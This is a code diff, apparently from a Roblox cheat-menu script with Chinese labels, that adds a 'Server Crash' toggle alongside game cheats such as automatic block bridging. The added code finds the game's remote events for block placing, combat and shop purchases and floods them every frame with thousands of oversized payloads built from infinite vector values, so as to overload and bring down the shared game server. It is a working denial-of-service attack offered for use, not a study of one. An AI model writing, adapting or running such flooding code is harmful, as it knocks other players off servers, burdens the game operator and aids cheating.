@@ -1071,6 +1071,51 @@ local success, err = pcall(function()
         end
     end)
 
+    AddScript("暴力功能", "伺服器崩潰 (Server Crash)", "嘗試透過大量遠端事件請求使伺服器癱瘓 (極高風險)。", function()
+        _G.ServerCrash = not _G.ServerCrash
+        Notify("伺服器崩潰", _G.ServerCrash and "已啟動，正在發送干擾數據..." or "已停止發送。", _G.ServerCrash and "Error" or "Info")
+        
+        if not _G.ServerCrash then return end
+        
+        task.spawn(function()
+            local remoteNames = {"PlaceBlock", "DamageBlock", "HitBlock", "SwordHit", "CombatEvents", "ShopBuyItem"}
+            local remotes = {}
+            
+            -- 預先收集所有可能的遠端事件
+            for _, name in ipairs(remoteNames) do
+                local r = ReplicatedStorage:FindFirstChild(name, true)
+                if r and r:IsA("RemoteEvent") then
+                    table.insert(remotes, r)
+                end
+            end
+            
+            if #remotes == 0 then
+                Notify("錯誤", "找不到任何可利用的遠端事件。", "Error")
+                _G.ServerCrash = false
+                return
+            end
+            
+            -- 高頻發送大量無效數據包
+            while _G.ServerCrash do
+                for i = 1, 50 do -- 每幀發送 50 個包
+                    for j = 1, #remotes do
+                        local r = remotes[j]
+                        -- 構造一個看似合法但處理起來極其耗時的大數據對象
+                        local payload = {}
+                        for k = 1, 100 do
+                            payload[tostring(k)] = Vector3_new(math.huge, math.huge, math.huge)
+                        end
+                        
+                        task.spawn(function()
+                            r:FireServer(payload)
+                        end)
+                    end
+                end
+                task_wait()
+            end
+        end)
+    end)
+
     -- === 自動化功能內容 ===
     AddScript("自動化功能", "自動鋪路 (Auto Bridge)", "在你行走的腳下自動放置方塊 (需持有方塊)。", function()
         _G.AutoBridge = not _G.AutoBridge
